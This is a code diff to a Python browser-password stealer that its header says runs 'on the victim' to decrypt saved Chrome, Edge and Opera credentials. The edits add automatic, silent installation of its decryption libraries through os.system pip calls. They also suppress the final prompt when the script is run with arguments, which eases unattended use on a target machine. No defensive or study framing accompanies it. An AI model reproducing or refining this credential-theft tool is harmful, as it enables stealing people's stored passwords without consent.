@@ -3,9 +3,17 @@
 ## Source: https://github.com/agentzex/chrome_v80_password_grabber
 ##  Run on the victim, works for Chrome, Edge (Chromium) and even Opera
 ##  Tested on Local systems, Local AD systems ánd Azure AD systems
-import os, json, base64, sqlite3, shutil, binascii, argparse
-import win32crypt  ## pip install pypiwin32
-from Crypto.Cipher import AES ## pip install pycryptodome
+import os, sys, json, base64, sqlite3, shutil, binascii, argparse
+try:
+    import win32crypt  ## pip install pypiwin32
+except:
+    os.system(getPythonPath() + ' -m pip install pypiwin32')
+    import win32crypt
+try:
+    from Crypto.Cipher import AES ## pip install pycryptodome
+except:
+    os.system(getPythonPath() + ' -m pip install pycryptodome')
+    from Crypto.Cipher import AES
 
 def get_master_key(masterkey_file):
     with open(masterkey_file, "r") as f:
@@ -98,6 +106,4 @@ if __name__ == '__main__':
         print('[+] Decrypted ' + str(len(lstChromeCreds)) + ' Opera credentials')
     except: pass
     
-
-    
-    #input('All done, press enter')
+    if(len(sys.argv)<=1): input('All done, press enter')
